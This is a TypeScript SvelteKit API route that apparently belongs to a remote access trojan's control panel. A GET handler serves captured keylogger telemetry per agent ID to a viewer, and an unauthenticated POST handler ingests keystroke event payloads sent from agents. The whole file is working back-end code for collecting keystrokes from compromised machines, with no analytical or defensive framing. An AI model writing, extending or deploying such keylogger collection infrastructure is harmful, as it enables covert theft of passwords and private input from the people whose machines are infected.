import { json, error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { keyloggerManager } from '$lib/server/rat/keylogger';
import { requireViewer } from '$lib/server/authorization';
import type { KeyloggerEventEnvelope } from '$lib/types/keylogger';

export const GET: RequestHandler = ({ params, locals }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}
	requireViewer(locals.user);
	const { telemetry } = keyloggerManager.getState(id);
	return json({ telemetry });
};

export const POST: RequestHandler = async ({ params, request }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	let envelope: KeyloggerEventEnvelope;
	try {
		envelope = (await request.json()) as KeyloggerEventEnvelope;
	} catch {
		throw error(400, 'Invalid keylogger event payload');
	}

	const telemetry = keyloggerManager.ingest(id, envelope);
	return json({ telemetry }, { status: 202 });
};
